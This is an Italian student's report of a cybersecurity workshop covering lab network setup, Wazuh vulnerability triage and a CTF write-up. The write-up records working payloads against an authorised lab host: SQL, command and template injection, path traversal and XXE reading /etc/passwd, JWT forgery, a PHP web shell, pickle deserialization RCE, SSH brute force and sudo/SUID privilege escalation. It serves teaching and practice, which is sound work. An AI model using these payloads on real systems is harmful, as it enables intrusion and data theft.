# ITS Cybersecurity Workshop — Technical Activity Report

> **Periodo:** 5–6 novembre 2026  
> **Ambito:** Network Security, Vulnerability Assessment, Red Team, CTF e Security Monitoring  
> **Ambiente:** Raspberry Pi 5, Ubuntu Server 26.04.1 LTS, ASUS RT-BE88U, Wazuh, Flipper Zero  
> **Autore:** Ivan Urlini

---

## Indice

1. [Introduzione](#1-introduzione)
2. [Ambiente e infrastruttura](#2-ambiente-e-infrastruttura)
3. [Attività del 5 novembre](#3-attività-del-5-novembre--giorno-1)
   - [Flipper Zero](#31-flipper-zero)
   - [Configurazione router](#32-configurazione-iniziale-dei-router)
   - [Raspberry Pi 5](#33-configurazione-del-raspberry-pi-5)
   - [Wazuh](#34-deployment-e-configurazione-di-wazuh)
   - [Vulnerability Detection e CVE triage](#35-vulnerability-detection-e-cve-triage)
4. [Attività del 6 novembre](#4-attività-del-6-novembre--giorno-2)
   - [Configurazione mesh](#41-configurazione-mesh-dei-router)
   - [Analisi CVE-2026-98432](#42-analisi-di-cve-2026-98432)
   - [Battle 1 — CTF](#43-battle-1--ctf)
5. [Risultati e considerazioni tecniche](#5-risultati-e-considerazioni-tecniche)
6. [Materiale e struttura del repository](#6-materiale-e-struttura-del-repository)

---

## 1. Introduzione

Il 5 e il 6 novembre 2026 si sono svolte due giornate di attività pratiche nell'ambito del corso di Cybersecurity presso ITS Academy Prodigi.

Le attività hanno riguardato la configurazione di un'infrastruttura di rete, la preparazione di sistemi Linux embedded, il deployment di una piattaforma SIEM/XDR, l'analisi delle vulnerabilità rilevate e alcune esercitazioni di sicurezza offensive.

Il lavoro ha combinato attività di **Blue Team** e **Red Team**:

- configurazione e monitoraggio di sistemi Linux;
- raccolta e analisi di eventi di sicurezza;
- identificazione e classificazione delle vulnerabilità;
- verifica dei prerequisiti di sfruttamento delle CVE;
- ricognizione della rete e dei servizi esposti;
- esercitazioni CTF su vulnerabilità web, di sistema, crittografiche e di rete.

L'obiettivo di questo documento è conservare una descrizione tecnica delle attività, delle configurazioni utilizzate, dei risultati osservati e degli strumenti impiegati.

---

## 2. Ambiente e infrastruttura

### 2.1 Hardware e dispositivi

| Dispositivo | Utilizzo |
|---|---|
| ASUS RT-BE88U (2 unità) | Infrastruttura Wi-Fi e configurazione mesh |
| Raspberry Pi 5 Model B Rev 1.1 | Sistema Linux di laboratorio e ambiente di analisi |
| Flipper Zero | Esercitazioni su Sub-GHz, infrarossi e BadUSB |
| Workstation | Amministrazione, collegamento SSH e attività di analisi |
| Server Wazuh | Raccolta e analisi degli eventi e delle vulnerabilità |

### 2.2 Software e strumenti

| Software / Strumento | Utilizzo |
|---|---|
| Ubuntu Server 26.04.1 LTS | Sistema operativo dei Raspberry Pi |
| Raspberry Pi Imager | Preparazione e configurazione della microSD |
| qFlipper | Aggiornamento firmware e gestione dei file del Flipper Zero |
| Wazuh | Security monitoring e Vulnerability Detection |
| Docker | Deployment del server Wazuh |
| OpenSSH | Amministrazione remota dei Raspberry Pi |
| Nmap | Network discovery e service enumeration |
| Scapy | Analisi di pacchetti e traffico PCAP |
| Hydra, John the Ripper, smbclient, rpcclient | Strumenti di supporto alle esercitazioni CTF |
| Nikto, Dirb, WhatWeb, curl | Analisi e interazione con servizi web |

### 2.3 Rete di laboratorio

La rete privata utilizzata durante le attività era basata sull'indirizzamento `192.168.50.0/24`.

Il collegamento alla rete ITS avveniva tramite il router principale, connesso all'infrastruttura centrale denominata `SALA_BONSIGNORI`.

Le postazioni dell'aula disponevano di prese Ethernet numerate, collegate a uno switch nel rack. Per collegare una postazione alla rete di laboratorio, la relativa porta dello switch delle postazioni veniva collegata a una porta libera del secondo switch presente nel rack.

Nel caso della postazione N30, la porta 30 veniva collegata a una porta disponibile del secondo switch.

Questa configurazione permetteva di distribuire la connettività alla rete privata del laboratorio senza modificare il collegamento principale all'infrastruttura ITS.

#### Indirizzi IP rilevanti

| Indirizzo | Dispositivo / ruolo |
|---|---|
| `192.168.50.1` | Router ASUS principale, secondo la scansione Nmap |
| `192.168.50.73` | Raspberry Pi personale, hostname `Raspberstein` |
| `192.168.50.110` | Raspberry Pi indicato nel report iniziale di Vulnerability Assessment |
| `192.168.50.10` | Target della competizione Battle 1 |
| `192.168.50.105` | Host utilizzato in una prova separata dello script CVE |
| `192.168.50.143` | Server Wazuh |

---

## 3. Attività del 5 novembre — Giorno 1

### 3.1 Flipper Zero

#### 3.1.1 Preparazione del dispositivo

Durante la prima giornata è stato ricevuto un Flipper Zero, accompagnato da una scheda microSD da 32 GB.

Per la gestione del dispositivo è stato installato **qFlipper**, utilizzato per:

- aggiornare il firmware;
- gestire il trasferimento dei file;
- interagire con il dispositivo da workstation.

È stato installato il firmware più recente disponibile al momento dell'attività. La versione esatta non è stata annotata.

<figure>
  <img src="docs/images/flipper-zero/flipper-box.jpg" alt="Confezione Flipper Zero" />
  <figcaption>Flipper Zero — confezione del dispositivo.</figcaption>
</figure>

<figure>
  <img src="docs/images/flipper-zero/flipper-first-boot.jpg" alt="Prima accensione Flipper Zero" />
  <figcaption>Prima accensione e schermata iniziale del dispositivo.</figcaption>
</figure>

#### 3.1.2 Sub-GHz

È stata effettuata una prima esplorazione della funzionalità radio Sub-GHz, osservando segnali trasmessi da dispositivi nelle vicinanze.

Una delle prove ha riguardato l'osservazione dei segnali emessi da una chiave automobilistica.

L'attività era di carattere esplorativo: non viene documentata alcuna clonazione o apertura del veicolo.

#### 3.1.3 Infrarossi (IR)

Sono state effettuate prove di acquisizione e riproduzione di segnali infrarossi.

I dispositivi utilizzati come riferimento erano:

- un telecomando per climatizzatore Mitsubishi;
- un telecomando per televisore Samsung utilizzato durante la lezione.

Per il climatizzatore sono stati registrati i comandi di accensione e spegnimento.

Per il televisore sono stati acquisiti diversi pulsanti, in modo da poter navigare nell'interfaccia del dispositivo.

#### 3.1.4 BadUSB

È stata esplorata la funzionalità BadUSB, che permette al Flipper Zero di presentarsi a un computer come dispositivo HID e inviare sequenze di input.

Sono stati realizzati due script dimostrativi per Windows.

**Script 1 — Creazione di 100 desktop virtuali**

Il file `scripts/win-d-demo.txt` contiene una sequenza di 100 istruzioni `CTRL-GUI D`, corrispondente alla scorciatoia `Win + Ctrl + D` di Windows che crea un nuovo desktop virtuale.

**Script 2 — Download e impostazione dello sfondo**

È stato realizzato un secondo script dimostrativo che apre una sessione PowerShell, scarica un'immagine da un URL e la imposta come sfondo del desktop Windows.

> **Nota di sicurezza:** gli script sono stati utilizzati come dimostrazioni in ambiente di laboratorio. L'esecuzione di payload HID deve sempre avvenire su dispositivi autorizzati.

---

### 3.2 Configurazione iniziale dei router

Nel pomeriggio sono state aperte e predisposte due unità ASUS RT-BE88U.

Le attività iniziali hanno riguardato:

1. collegamento fisico dei dispositivi;
2. alimentazione dei router;
3. collegamento alla rete Wi-Fi iniziale `Asus_E8`;
4. accesso all'interfaccia di amministrazione;
5. esecuzione della procedura guidata di configurazione iniziale;
6. collegamento del router principale alla rete ITS.

La configurazione mesh delle due unità è stata completata il giorno successivo.

---

### 3.3 Configurazione del Raspberry Pi 5

#### 3.3.1 Preparazione del sistema

È stato predisposto un Raspberry Pi 5 Model B Rev 1.1.

La preparazione della scheda microSD da 32 GB è stata effettuata utilizzando Raspberry Pi Imager.

È stato installato:

- **Sistema operativo:** Ubuntu Server 26.04.1 LTS 64-bit
- **Architettura:** ARM64 / `aarch64`
- **Hostname:** `Raspberstein`
- **Username:** `ivan`

<figure>
  <img src="docs/images/raspberry-pi/raspberry-pi-5-setup.jpg" alt="Raspberry Pi 5 predisposto per il laboratorio" />
  <figcaption>Raspberry Pi 5 installato nel case e collegato alla rete e all'alimentazione.</figcaption>
</figure>

#### 3.3.2 Configurazione SSH

Durante la configurazione iniziale è stato abilitato SSH con autenticazione tramite chiave pubblica.

Al primo avvio è stato eseguito:

```bash
ip address
```

Il Raspberry Pi ha ottenuto l'indirizzo `192.168.50.73`. Dalla workstation principale è stato quindi possibile accedere al dispositivo:

```bash
ssh ivan@Raspberstein
```

---

### 3.4 Deployment e configurazione di Wazuh

#### 3.4.1 Installazione del server

Il deployment è stato effettuato tramite Docker, seguendo la documentazione ufficiale del progetto.

L'interfaccia web era raggiungibile dagli altri partecipanti della rete di laboratorio tramite `192.168.50.143`.

#### 3.4.2 Installazione degli agent

Dopo il deployment del server, è stato installato e configurato un Wazuh Agent sui Raspberry Pi.

Funzionalità utilizzate durante l'attività:

- inventario del sistema;
- raccolta degli eventi;
- monitoraggio delle configurazioni;
- Vulnerability Detection;
- identificazione dei pacchetti associati a vulnerabilità note.

#### 3.4.3 Evidenze dalla dashboard

L'agent del Raspberry Pi personale è identificato nella dashboard con i seguenti dati:

| Campo | Valore |
|---|---|
| Agent ID | `006` |
| Hostname | `Raspberstein` |
| IP | `192.168.50.73` |
| Sistema operativo | Ubuntu 26.04.1 LTS |
| Versione Wazuh Agent | `v4.14.9` |
| Stato | Active |
| Cluster node | `node01` |

<figure>
  <img src="docs/images/wazuh/agent-overview.png" alt="Dettagli agent Wazuh Raspberstein" />
  <figcaption>Dettaglio dell'agent Wazuh associato a Raspberstein.</figcaption>
</figure>

<figure>
  <img src="docs/images/wazuh/agent-dashboard.png" alt="Dashboard Wazuh dell'endpoint" />
  <figcaption>Dashboard dell'endpoint con inventario, eventi e informazioni MITRE ATT&CK.</figcaption>
</figure>

---

### 3.5 Vulnerability Detection e CVE triage

#### 3.5.1 Esportazione dei risultati

I risultati sono stati esportati in formato CSV:

```text
events-2026-11-05T16_02_20.745Z.csv
```

Una parte consistente delle vulnerabilità rilevate era associata ai pacchetti kernel:

```text
linux-image-7.0.0-1017-raspi
linux-image-7.0.0-1020-raspi
```

#### 3.5.2 Risultati della scansione

| Severità | Vulnerabilità rilevate |
|---|---:|
| Critical | 404 |
| High | 3.042 |
| Medium | 1.555–1.556 |
| Low | 321 |

<figure>
  <img src="docs/images/wazuh/vulnerability-detection.png" alt="Risultati Vulnerability Detection" />
  <figcaption>Riepilogo delle vulnerabilità rilevate, suddivise per severità.</figcaption>
</figure>

<figure>
  <img src="docs/images/wazuh/vulnerability-detection-dashboard.png" alt="Dashboard Vulnerability Detection completa" />
  <figcaption>Dashboard completa: contatori per severità, top CVE, top package e distribuzione temporale.</figcaption>
</figure>

<figure>
  <img src="docs/images/wazuh/agent-list.png" alt="Lista agent Wazuh" />
  <figcaption>Lista degli agent nella dashboard Wazuh: Raspberstein (006), stato active, IP 192.168.50.73.</figcaption>
</figure>

#### 3.5.3 Analisi dei prerequisiti di sfruttamento

| Categoria | Esempi | Prerequisiti individuati |
|---|---|---|
| Filesystem | NTFS3, F2FS, Btrfs, XFS, OCFS2, UDF, HFS+, SquashFS | Accesso locale, mount del filesystem o capacità privilegiate come `CAP_SYS_ADMIN` |
| Driver | USB, Bluetooth, Wi-Fi, GPU, HID, IIO, media, RDMA, NVMe, SCSI, ALSA, DRM | Presenza di dispositivi specifici o interazione locale |
| Network stack | SCTP, ATM, QRTR, vsock, MPTCP e altri protocolli | Presenza e configurazione del protocollo interessato |
| Local Privilege Escalation | Vulnerabilità LPE | Accesso locale preliminare al sistema |

#### 3.5.4 Risultato del triage

Nel CSV analizzato non è stata individuata una vulnerabilità High che fornisse un percorso concreto di compromissione remota non autenticata, considerando i servizi e la configurazione osservati sul target.

---

## 4. Attività del 6 novembre — Giorno 2

### 4.1 Configurazione mesh dei router

Durante la seconda giornata è stata completata la configurazione mesh delle due unità ASUS RT-BE88U.

Sono state predisposte due reti wireless:

```text
Battle2.4G
Battle5G
```

### 4.2 Analisi di CVE-2026-98432

#### 4.2.1 Contesto

La vulnerabilità è una condizione di **Use-After-Free (UAF) / race condition** nel percorso di handshake TCP IPv4 del kernel Linux, nella funzione `tcp_v4_syn_recv_sock()`. CVSS 9.8.

#### 4.2.2 Ambiente analizzato

| Campo | Valore |
|---|---|
| Hostname | `Raspberstein` |
| IP | `192.168.50.73` |
| OS | Ubuntu 26.04.1 LTS |
| Architettura | `aarch64` |
| Kernel | `7.0.0-1020-raspi` |

#### 4.2.3 Verifica della superficie esposta

```text
net.mptcp.enabled = 1
net.ipv4.ip_forward = 0
net.ipv4.tcp_migrate_req = 0
```

- SSH esposto sulla porta TCP 22;
- nessun listener MPTCP rilevato;
- IP forwarding disabilitato.

#### 4.2.4 Risultato dell'analisi

Il percorso RCE documentato richiedeva un contesto MPTCP non presente sul target. La vulnerabilità era rilevante nel kernel, ma non applicabile alla configurazione osservata. Lo script Python di analisi (Scapy 2.8.0) non ha prodotto una dimostrazione di sfruttamento: errori durante la costruzione del pacchetto IP (`ValueError`) e accesso ai raw socket (`PermissionError`). Il risultato è da considerarsi un test non conclusivo.

---

### 4.3 Battle 1 — CTF

#### 4.3.1 Obiettivo

Competizione pratica CTF: individuare il target, enumerarne i servizi, sfruttarne le vulnerabilità e recuperare le flag nel formato `PRODIGI{...}`, da inviare tramite la piattaforma CTFd.

**Target:** `battle1` — `192.168.50.10`

#### 4.3.2 Regole e perimetro

- Attaccare esclusivamente `battle1`.
- Non attaccare CTFd, Wazuh, access point, rete o dispositivi degli altri partecipanti.
- Niente DoS, flood, fork bomb o riempimento disco.
- Sui file di sistema: **solo lettura**. Nessuna modifica o cancellazione di chiavi, valori o flag.

<figure>
  <img src="docs/images/battle/battle-briefing.png" alt="Briefing della competizione Battle 1" />
  <figcaption>Briefing iniziale: obiettivi, modalità di accesso e regole della competizione.</figcaption>
</figure>

<figure>
  <img src="docs/images/battle/ctf-web-challenges.png" alt="Challenge Web CTFd" />
  <figcaption>Scoreboard CTFd — categoria Web: SQL Injection, Command Injection, IDOR, SSRF, JWT debole, SSTI.</figcaption>
</figure>

<figure>
  <img src="docs/images/battle/ctf-unknown-challenges.png" alt="Challenge categoria ??? CTFd" />
  <figcaption>Scoreboard CTFd — categoria ???: Reperto #3, :8007, :8003, Reperto #1, Reperto #2, SSH :2223, :8009, :8006, SSH :2224, :8011.</figcaption>
</figure>

<figure>
  <img src="docs/images/battle/ctf-system-forensics-crypto.png" alt="Challenge System, Forensics, Crypto CTFd" />
  <figcaption>Scoreboard CTFd — System (SSH foothold, Privilege Escalation), Forensics (DNS Exfiltration), Crypto (Weak RSA).</figcaption>
</figure>

#### 4.3.3 Preparazione dell'ambiente

Installazione degli strumenti sul Raspberry Pi (partito con il solo `nmap`):

```bash
sudo apt update
sudo apt install -y \
  arp-scan netcat-openbsd nikto dirb hydra john \
  smbclient whatweb bind9-dnsutils curl wget git jq
```

> `enum4linux` non è disponibile nei repository di Ubuntu 26.04; rimosso dalla lista. Per l'enumerazione SMB sono stati impiegati `smbclient` e `rpcclient`.

Librerie Python per l'analisi di file e traffico:

```bash
pip install scapy --break-system-packages
```

#### 4.3.4 Network discovery

```bash
sudo nmap -sn 192.168.50.0/24
```

L'indirizzo di `battle1` è stato comunicato dal docente: `192.168.50.10`. I servizi delle challenge erano esposti su porte diverse dello stesso IP.

---

#### 4.3.5 Challenge Web

---

##### SQL Injection — `:8001` (100 pt)

**Problema.** Form di login vulnerabile: la query di autenticazione concatena l'input dell'utente senza sanificarlo.

**Ragionamento.** Iniettando nel campo *Utente* una stringa che chiude il valore SQL e aggiunge un commento, si annulla il controllo della password e si accede come utente scelto.

**Input usato** (campo *Utente*, password qualsiasi):

```
admin' -- 
```

> Lo spazio finale dopo i trattini è necessario per il commento in MySQL.

**Flag:** `PRODIGI{sqli_b3075a032f5b}`

---

##### Command Injection — `:8002` (150 pt)

**Problema.** Tool di "ping di rete" che passa l'input direttamente alla shell (`ping -c 1 <input>`, `shell=True` in Python).

**Ragionamento.** Con un separatore di comandi (`;`) si esegue un secondo comando dopo il ping. Il servizio gira in un container Docker; il flag era in `/flag.txt` nella root.

**Input usati** (campo del form):

```
127.0.0.1; ls
127.0.0.1; ls -la /
127.0.0.1; cat /flag.txt
```

**Flag:** `PRODIGI{… da inserire}`

---

##### Path Traversal / LFI — `:8003` (150 pt)

**Problema.** Wiki che legge file tramite il parametro `?page=` senza sanificare il percorso.

**Ragionamento.** Con sequenze `../` si esce dalla cartella delle pagine (`/app/pages`) e si leggono file arbitrari del filesystem.

**Comandi:**

```bash
# conferma: lettura di /etc/passwd
curl -s "http://192.168.50.10:8003/view?page=../../../../etc/passwd"

# lettura del flag a vari livelli e con path assoluto
for i in 1 2 3 4 5; do
  dots=$(printf '../%.0s' $(seq 1 $i))
  curl -s "http://192.168.50.10:8003/view?page=${dots}flag.txt"; echo
done
curl -s "http://192.168.50.10:8003/view?page=/flag.txt"
```

**Flag:** `PRODIGI{… da inserire}`

---

##### IDOR — `:8004` (200 pt)

**Problema.** Applicazione "MyDocs": i documenti sono esposti tramite un parametro `?id=` numerico nell'URL, senza verificare l'appartenenza all'utente autenticato.

**Ragionamento.** Dopo il login come utente normale (`mario / mario`), si modifica manualmente l'`id` per accedere ai documenti altrui.

**URL testati:**

```
http://192.168.50.10:8004/doc?id=1
http://192.168.50.10:8004/doc?id=2
http://192.168.50.10:8004/doc?id=3
...
```

**Flag:** `PRODIGI{… da inserire}`

---

##### JWT debole — `:8005` (250 pt)

**Problema.** Area riservata protetta da JWT (HS256) firmato con chiave debole.

**Ragionamento.** Il JWT è base64-decodificabile: header e payload sono leggibili. Se la chiave HMAC è banale, si può craccare, rifirmare un payload con `role: admin` e il server lo accetta.

**Procedura:**

```bash
# 1. recupero token guest
curl -i -s "http://192.168.50.10:8005/login?user=guest" | grep -i "set-cookie"

# 2. brute force della chiave HMAC per confronto di firma
# (chiave trovata: "secret")
TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.bx33B7Bp884CqBQ99VLJg1LGEs03istwE4yucGpqYFI'
H=$(echo -n "$TOKEN" | cut -d. -f1-2)
S=$(echo -n "$TOKEN" | cut -d. -f3)
while read k; do
  sig=$(echo -n "$H" | openssl dgst -sha256 -hmac "$k" -binary | openssl base64 -A | tr '+/' '-_' | tr -d '=')
  [ "$sig" = "$S" ] && echo ">>> CHIAVE: $k" && break
done < ~/keys.txt

# 3. forge del token admin con chiave "secret"
KEY='secret'
HEADER=$(echo -n '{"alg":"HS256","typ":"JWT"}' | openssl base64 -A | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"user":"admin","role":"admin"}' | openssl base64 -A | tr '+/' '-_' | tr -d '=')
SIG=$(echo -n "$HEADER.$PAYLOAD" | openssl dgst -sha256 -hmac "$KEY" -binary | openssl base64 -A | tr '+/' '-_' | tr -d '=')
TOKEN_ADMIN="$HEADER.$PAYLOAD.$SIG"

# 4. accesso con il token forgiato
curl -s -b "token=$TOKEN_ADMIN" http://192.168.50.10:8005/
```

**Flag:** `PRODIGI{jwt_d77b03838b03}`

---

##### Upload / RCE — `:8006` (300 pt)

**Problema.** "Gallery" (Apache + PHP) con upload di file senza controllo del tipo.

**Ragionamento.** Si carica una web shell PHP che esegue comandi tramite parametro GET. Il processo gira come `www-data` in un container dedicato.

**Comandi:**

```bash
# creazione e upload della web shell
echo '<?php system($_GET["c"]); ?>' > ~/sh.php
curl -s -F "f=@/home/ivan/sh.php" http://192.168.50.10:8006/
# risposta: Caricato: uploads/sh.php

# verifica esecuzione e lettura flag
curl -s "http://192.168.50.10:8006/uploads/sh.php?c=id"
curl -s "http://192.168.50.10:8006/uploads/sh.php?c=cat+/flag.txt"
```

**Flag:** `PRODIGI{upload_3648c9842bce}`

---

##### Servizio :8007 — backup esposto (100 pt)

**Problema.** Sito istituzionale Flask; nessun link visibile a contenuto rilevante.

**Ragionamento.** Directory brute force con `dirb` ha individuato `/robots.txt` (CODE:200) e `/backup` (CODE:308 → redirect a `/backup/`). La cartella `/backup/` conteneva un file `.env` esposto pubblicamente.

**Comandi:**

```bash
# enumerazione directory
dirb http://192.168.50.10:8007/ -S

# lettura robots.txt e listing della cartella backup
curl -s http://192.168.50.10:8007/robots.txt
curl -s -L http://192.168.50.10:8007/backup/

# lettura del file .env
curl -s http://192.168.50.10:8007/backup/.env
```

Il file `.env` conteneva credenziali DB, secret key e il flag nel campo `APP_FLAG`.

**Flag:** `PRODIGI{backup_5a0a0d277d45}`

---

##### SSRF — `:8008` (200 pt)

**Problema.** Tool di "link preview" che scarica lato server l'URL fornito, senza filtrare destinazioni interne.

**Ragionamento.** Si forza il server a contattare servizi interni non raggiungibili da fuori (`file://` era bloccato, solo http/https). L'app è esposta esternamente su `:8008` ma internamente ascolta su `:8000`, dove l'endpoint `/internal` risponde solo alle richieste provenienti da localhost.

**Loop di scoperta porte interne:**

```bash
for p in 80 3000 5000 8000 8001 8002 8003 8004 8005 8080 8081 8888 9000 9090; do
  body=$(curl -s "http://192.168.50.10:8008/fetch?url=http://127.0.0.1:$p/")
  echo "$body" | grep -qiE "errore|control characters|ammessi" && continue
  [ -z "$body" ] && continue
  echo "===== PORTA $p ====="; echo "$body" | head -30
done
```

**Loop di ricerca endpoint interni sulla porta trovata (8000):**

```bash
for path in flag flag.txt admin internal secret metadata api/flag .flag; do
  body=$(curl -s "http://192.168.50.10:8008/fetch?url=http://127.0.0.1:8000/$path")
  echo "===== /$path ====="; echo "$body" | head -5; echo
done
```

**Comando risolutivo:**

```bash
curl -s "http://192.168.50.10:8008/fetch?url=http://127.0.0.1:8000/internal"
```

**Flag:** `PRODIGI{ssrf_595f3ef63686}`

---

##### XXE — `:8009` (challenge XML)

**Problema.** Parser XML ("Importa profilo") che risolve le entità esterne.

**Ragionamento.** Dichiarando un'entità esterna `SYSTEM` che punta a un file locale, il parser la sostituisce col contenuto del file nella risposta.

**Comandi:**

```bash
# conferma: lettura /etc/passwd
curl -s http://192.168.50.10:8009/parse --data-urlencode 'xml=<?xml version="1.0"?>
<!DOCTYPE profilo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<profilo><name>&xxe;</name></profilo>'

# lettura flag
curl -s http://192.168.50.10:8009/parse --data-urlencode 'xml=<?xml version="1.0"?>
<!DOCTYPE profilo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<profilo><name>&xxe;</name></profilo>'
```

**Flag:** `PRODIGI{… da inserire}`

---

##### SSTI — `:8010` (400 pt)

**Problema.** "Biglietto personalizzato": il nome inserito viene inglobato in un template Jinja2 senza isolamento ed eseguito lato server.

**Ragionamento.** Test con `{{7*7}}`: se la pagina mostra `49`, il server valuta l'espressione → si usa il template engine per eseguire codice Python e leggere il flag.

**Input usati** (campo *Nome*):

```
{{7*7}}
{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}
```

**Flag:** `PRODIGI{… da inserire}`

---

##### Pickle Deserialization — `:8011` (450 pt)

**Problema.** Le preferenze utente sono caricate da un cookie `prefs` che contiene un **oggetto pickle serializzato in base64**. Il server lo deserializza senza controlli.

**Ragionamento.** `pickle.loads` su dati non fidati permette esecuzione di codice arbitrario: si costruisce un oggetto il cui `__reduce__` richiama `subprocess.check_output`. L'output del comando (il flag) viene restituito direttamente nella pagina.

**Decodifica del cookie originale (verifica):**

```bash
python3 -c "
import base64, pickle
print(pickle.loads(base64.b64decode(
  'gASVMAAAAAAAAAB9lCiMBXRoZW1llIwEZGFya5SMBGxhbmeUjAJpdJSMBHVzZXKUjAZvc3BpdGWUdS4='
)))
"
```

**Exploit completo:**

```bash
python3 - <<'EOF'
import base64, pickle, subprocess

class RCE:
    def __reduce__(self):
        cmd = "cat /flag.txt 2>/dev/null || grep -rh PRODIGI / 2>/dev/null"
        return (subprocess.check_output, (["sh", "-c", cmd],))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
out = subprocess.check_output([
    "curl", "-s", "http://192.168.50.10:8011/",
    "-H", f"Cookie: prefs={payload}"
]).decode(errors="replace")
print(out)
EOF
```

**Flag:** `PRODIGI{deserial_fec588c4599d}`

---

#### 4.3.6 Challenge Forensics

---

##### Stego — Reperto #3 (100 pt)

**Problema.** File `challenge.png` fornito come allegato della challenge.

**Ragionamento.** Il PNG è un'immagine finta 1×1 pixel (116 byte): il flag non è nei pixel ma in chiaro in coda al file, visibile con `strings`.

**Comando:**

```bash
strings challenge.png | grep -i prodigi
```

**Flag:** `PRODIGI{stego_a5232ce6b6af}`

---

##### Analisi PCAP — Reperto #2 (150 pt)

**Problema.** File `capture.pcap`, cattura di traffico di rete.

**Ragionamento.** La cattura conteneva una richiesta HTTP di login non cifrata: username e password viaggiavano in chiaro.

**Comando:**

```bash
strings capture.pcap | grep -i prodigi
# output: username=admin&password=PRODIGI{pcap_a6ad9d4c0f4a}
```

**Flag:** `PRODIGI{pcap_a6ad9d4c0f4a}`

---

##### DNS Exfiltration (200 pt)

**Problema.** File `dns.pcap`: dati esfiltrati nascosti in query DNS, mescolate a traffico legittimo come copertura.

**Ragionamento.** Alcune query puntavano a `exfil.prodigi-lab.local` con struttura `<indice>.<hex>.exfil.prodigi-lab.local`. Isolando le query per indice (0→3), concatenando i blocchi hex e decodificandoli si ottiene il flag.

**Comandi:**

```bash
pip install scapy --break-system-packages

python3 - <<'EOF'
from scapy.all import rdpcap, DNSQR

pkts = rdpcap("dns.pcap")
names = []
for p in pkts:
    if p.haslayer(DNSQR):
        q = p[DNSQR].qname
        if isinstance(q, bytes):
            q = q.decode(errors="replace")
        names.append(q)

print("Query DNS trovate:")
for n in names:
    print(n)

# ricostruzione: indici 0-3, blocchi hex
chunks = {
    0: "50524f444947497b",
    1: "646e735f37376639",
    2: "6262363963306338",
    3: "7d"
}
hexstr = "".join(chunks[i] for i in sorted(chunks))
print("\nFlag:", bytes.fromhex(hexstr).decode())
EOF
```

**Flag:** `PRODIGI{dns_77f9bb69c0c8}`

---

#### 4.3.7 Challenge Crypto

---

##### XOR — Reperto #1 (150 pt)

**Problema.** File `cipher.b64`: doppio strato, base64 esterno e XOR interno.

**Ragionamento.** Dopo la decodifica base64 si ottengono 25 byte. Usando il formato noto delle flag (`PRODIGI{`) come known-plaintext, si recupera la chiave per XOR confronto: i primi byte del file erano tutti `0x00`, il che rivela che la chiave è `PRODIGI` stessa ripetuta.

**Comando:**

```bash
python3 - <<'EOF'
import base64

data = base64.b64decode(open('cipher.b64').read().strip())
known = b"PRODIGI{"
key = bytes([data[i] ^ known[i] for i in range(7)])   # chiave: b'PRODIGI'
out  = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
print(out.decode())
EOF
```

**Flag:** `PRODIGI{xor_07887e9c8ed7}`

---

##### Weak RSA (300 pt)

**Problema.** File `rsa.txt` con `n`, `e`, `c`: chiave RSA 512 bit generata con due primi troppo vicini.

**Ragionamento.** Quando i due fattori primi di `n` sono vicini, la **fattorizzazione di Fermat** li individua in poche iterazioni. Con `p` e `q` si ricostruisce la chiave privata `d` e si decifra `c`.

**Comando:**

```bash
python3 - <<'EOF'
import math

n = 6905786601754266564837543606884462848145260516987000679500952424623594951078187558565831815982512463008311659958014956107564657581097794150820209574556751
e = 65537
c = 2965863329765650628127992649407248329055600326512661995999898645756160993827172074856188982216281854032928097641174678174792226543438468309634079048905781

# fattorizzazione di Fermat
a = math.isqrt(n) + 1
while True:
    b2 = a * a - n
    b  = math.isqrt(b2)
    if b * b == b2:
        break
    a += 1

p, q = a - b, a + b
d = pow(e, -1, (p - 1) * (q - 1))
m = pow(c, d, n)
print(m.to_bytes((m.bit_length() + 7) // 8, 'big').decode())
EOF
```

**Flag:** `PRODIGI{rsa_ebb5d2838cbe}`

---

#### 4.3.8 Challenge System

---

##### SSH Foothold — `:2222` (150 pt)

**Problema.** Accesso iniziale via SSH. Hint fornito nel briefing: `ssh student@192.168.50.10 -p 2222`.

**Ragionamento.** Schema di credenziali debole: password uguale all'username.

**Comandi:**

```bash
ssh student@192.168.50.10 -p 2222
# password: student

# dentro la sessione
ls -la
cat user.txt
```

**Flag:** `PRODIGI{… da inserire}` (contenuto di `user.txt`)

---

##### Privilege Escalation — box `student` (350 pt)

**Problema.** Diventare root sulla stessa macchina della foothold.

**Ragionamento.** `sudo -l` mostra che `find` è eseguibile come root senza password. Tramite `-exec` (GTFOBins), `find` lancia una shell che eredita i privilegi di root.

**Comandi:**

```bash
# verifica privilegi sudo
sudo -l
# output: (root) NOPASSWD: /usr/bin/find

# apertura shell root
sudo /usr/bin/find . -maxdepth 0 -exec /bin/sh \;

# verifica e lettura flag (solo lettura)
id
cat /root/root.txt
```

**Flag:** `PRODIGI{box_root_0aa673c0f43e}`

---

##### SSH :2223 (200 pt) — accesso e privesc SUID

**Problema.** Seconda SSH esposta. Utente e password non forniti: da individuare.

**Ragionamento.** Brute force con schema password=username su lista di nomi comuni → credenziali `dev/dev`. L'`entrypoint.sh` del container rivela che il flag è in `/root/root.txt` (permessi `600`, solo root) e proviene da `/flags/suid.txt`: l'indizio punta a un binario SUID. Il `find` dei SUID individua `/opt/report`; dal sorgente `report.c` risulta che esegue `system(argv[1])` dopo `setuid(0)`, cioè qualsiasi comando passato come argomento, con privilegi di root.

**Comandi:**

```bash
# brute force utente
printf 'student\nguest\ndev\nuser\nprodigi\nadmin\ntest\n' > ~/u.txt
hydra -I -L ~/u.txt -e s -t 4 -f ssh://192.168.50.10:2223
# risultato: login dev / password dev

# accesso
ssh -p 2223 dev@192.168.50.10

# enumerazione all'interno del container
cat /entrypoint.sh
find / -perm -4000 -type f 2>/dev/null   # -> /opt/report
cat /opt/report.c                        # system(argv[1]) con setuid(0)

# lettura flag come root (solo lettura, nessuna scrittura)
/opt/report "cat /root/root.txt"
```

**Flag:** `PRODIGI{suid_983637102669}`

---

##### SSH :2224 (300 pt)

**Problema.** Terza SSH; stesso schema password=username ma con utente di ruolo tecnico non ovvio.

**Ragionamento.** Dopo tentativi falliti con utenti generici, brute force con lista di ruoli tecnici (`ops`, `deploy`, `ci`, `build`, …) → credenziali `ops/ops`.

